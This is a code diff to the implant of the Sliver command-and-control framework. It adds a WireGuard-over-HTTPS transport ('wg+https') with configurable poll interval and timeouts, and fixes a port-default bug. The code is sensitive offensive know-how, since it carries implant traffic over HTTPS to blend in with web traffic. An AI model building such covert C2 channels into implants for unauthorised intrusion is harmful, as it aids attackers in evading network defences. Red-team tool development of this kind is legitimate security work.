@@ -48,6 +48,7 @@ import (
 
 	// {{if .Config.IncludeWG}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
+	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
 
 	// {{end}}
@@ -162,6 +163,17 @@ func StartConnectionLoop(abort <-chan struct{}, temporaryC2 ...string) <-chan *C
 				if err != nil {
 					// {{if .Config.Debug}}
 					log.Printf("[wg] Connection failed %s", err)
+					// {{end}}
+					continue
+				}
+				// {{end}}  - IncludeWG
+				// {{if .Config.IncludeWG}}
+			case "wg+https":
+				// *** WG over HTTPS ***
+				connection, err = wgConnectWithHTTPBind(uri)
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[wg/https] Connection failed %s", err)
 					// {{end}}
 					continue
 				}
@@ -447,7 +459,40 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 // {{end}} -IncludeMTLS
 
 // {{if .Config.IncludeWG}}
+// newWGHTTPBindForURL - Build the wg-over-https bind for a wg+https
+// connection string: the port defaults to 443, the idle poll interval
+// to 10s, and the client HTTP timeout is max(net-timeout, hold + 5s)
+// so the URL override can lengthen but not undercut the server hold.
+func newWGHTTPBindForURL(uri *url.URL) conn.Bind {
+	pollInterval := wireguard.DefaultWGHTTPPollInterval
+	if value := uri.Query().Get("wg-poll-interval"); value != "" {
+		if parsed, err := time.ParseDuration(value); err == nil && parsed > 0 {
+			pollInterval = parsed
+		}
+	}
+	netTimeout := wireguard.DefaultWGHTTPNetTimeout
+	if value := uri.Query().Get("net-timeout"); value != "" {
+		if parsed, err := time.ParseDuration(value); err == nil && parsed > 0 {
+			netTimeout = parsed
+		}
+	}
+	clientTimeout := wireguard.WGHTTPClientTimeout(netTimeout, pollInterval)
+	return wireguard.NewHTTPBind(uri.String(), pollInterval, clientTimeout)
+}
+
+// wgConnectWithHTTPBind - A wg connect over the wg-over-https bind.
+func wgConnectWithHTTPBind(uri *url.URL) (*Connection, error) {
+	bind := newWGHTTPBindForURL(uri)
+	return wgConnectWithBind(uri, bind)
+}
+
+// wgConnect - The wg session connect over the default UDP bind.
 func wgConnect(uri *url.URL) (*Connection, error) {
+	return wgConnectWithBind(uri, nil)
+}
+
+// wgConnectWithBind - The wg session connect through a specific bind.
+func wgConnectWithBind(uri *url.URL, bind conn.Bind) (*Connection, error) {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
@@ -499,10 +544,16 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 		// {{end}}
 		lport, err := strconv.Atoi(uri.Port())
 		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Error parsing wg listen port %s (default to 53)", err)
-			// {{end}}
-			lport = 53
+			// wg+https has no UDP listen port; the peer endpoint port is
+			// the HTTPS port. A missing port must not become 53.
+			if bind != nil {
+				lport = int(wireguard.DefaultWGHTTPSPort)
+			} else {
+				// {{if .Config.Debug}}
+				log.Printf("Error parsing wg listen port %s (default to 53)", err)
+				// {{end}}
+				lport = 53
+			}
 		}
 		// Attempt to resolve the hostname in case
 		// we received a domain name and not an IP address.
@@ -515,7 +566,11 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 			return errors.New("{{if .Config.Debug}}Invalid address{{end}}")
 		}
 		hostname := addrs[0]
-		conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
+		if bind == nil {
+			conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
+		} else {
+			conn, dev, err = wireguard.WGConnectWithBind(hostname, uint16(lport), bind)
+		}
 		if err != nil {
 			return err
 		}
